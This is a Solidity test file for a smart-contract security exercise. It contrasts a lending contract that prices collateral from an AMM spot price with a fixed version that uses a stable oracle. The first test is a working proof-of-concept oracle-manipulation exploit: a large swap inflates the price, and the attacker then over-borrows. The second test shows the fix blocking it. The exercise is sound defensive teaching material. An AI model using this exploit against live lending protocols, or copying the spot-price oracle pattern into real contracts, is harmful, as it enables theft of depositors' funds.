// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";

import {ERC20Mock} from "../src/common/ERC20Mock.sol";
import {OracleMock} from "../src/common/OracleMock.sol";
import {V1_SpotPriceAMM} from "../src/oracle-manipulation/V1_SpotPriceAMM.sol";
import {V1_VulnerableLending} from "../src/oracle-manipulation/V1_VulnerableLending.sol";
import {V1_FixedLending} from "../src/oracle-manipulation/V1_FixedLending.sol";

contract OracleManipulationTest is Test {
    ERC20Mock internal col;
    ERC20Mock internal debt;

    V1_SpotPriceAMM internal amm;
    V1_VulnerableLending internal lendVuln;

    OracleMock internal fixedOracle;
    V1_FixedLending internal lendFixed;

    address internal lp = address(0xBEEF);
    address internal attacker = address(0xA11CE);

    function setUp() public {
        col = new ERC20Mock("Collateral", "COL");
        debt = new ERC20Mock("Debt", "DEBT");

        // Mint balances
        col.mint(lp, 200 ether);
        debt.mint(lp, 200 ether);

        col.mint(attacker, 20 ether);
        debt.mint(attacker, 500 ether);

        // AMM with initial liquidity 100 COL : 100 DEBT (price = 1)
        amm = new V1_SpotPriceAMM(address(col), address(debt));

        vm.startPrank(lp);
        col.approve(address(amm), type(uint256).max);
        debt.approve(address(amm), type(uint256).max);
        amm.addLiquidity(100 ether, 100 ether);
        vm.stopPrank();

        // Vulnerable lending uses AMM spot price as oracle. LTV=50%
        lendVuln = new V1_VulnerableLending(address(col), address(debt), address(amm), 0.5e18);

        // Seed lending pool with DEBT liquidity (so it can lend out)
        debt.mint(address(lendVuln), 1000 ether);

        // Fixed lending uses stable oracle (price pinned to 1)
        fixedOracle = new OracleMock(1e18);
        lendFixed = new V1_FixedLending(address(col), address(debt), address(fixedOracle), 0.5e18);
        debt.mint(address(lendFixed), 1000 ether);
    }

    function test_exploit_spot_price_manipulation_allows_overborrow() public {
        // Attacker deposits 10 COL as collateral
        vm.startPrank(attacker);
        col.approve(address(lendVuln), type(uint256).max);
        debt.approve(address(amm), type(uint256).max);

        lendVuln.depositCollateral(10 ether);

        uint256 priceBefore = amm.spotPriceDebtPerCol(); // ~1e18
        uint256 maxBefore = lendVuln.maxBorrowable(attacker); // ~5 DEBT
        assertApproxEqAbs(priceBefore, 1e18, 1); // near 1
        assertEq(maxBefore, 5 ether);

        // Manipulate spot price: swap a lot of DEBT for COL.
        // This increases reserveDebt and decreases reserveCol => priceDebtPerCol spikes.
        amm.swapExactDebtForCol(200 ether, 0);

        uint256 priceAfter = amm.spotPriceDebtPerCol();
        assertGt(priceAfter, 5e18); // price should jump significantly

        uint256 maxAfter = lendVuln.maxBorrowable(attacker);
        assertGt(maxAfter, 20 ether); // now attacker can borrow far more than 5

        // Over-borrow compared to honest pricing:
        lendVuln.borrow(40 ether);

        assertEq(debt.balanceOf(attacker) >= 40 ether, true);
        vm.stopPrank();
    }

    function test_fix_stable_oracle_blocks_overborrow() public {
        vm.startPrank(attacker);
        col.approve(address(lendFixed), type(uint256).max);
        debt.approve(address(amm), type(uint256).max);

        lendFixed.depositCollateral(10 ether);

        // Manipulate AMM spot price anyway (should not affect fixed lending)
        amm.swapExactDebtForCol(200 ether, 0);

        uint256 maxFixed = lendFixed.maxBorrowable(attacker);
        assertEq(maxFixed, 5 ether);

        // Attempt same over-borrow should revert
        vm.expectRevert("EXCEEDS_MAX");
        lendFixed.borrow(40 ether);

        vm.stopPrank();
    }
}
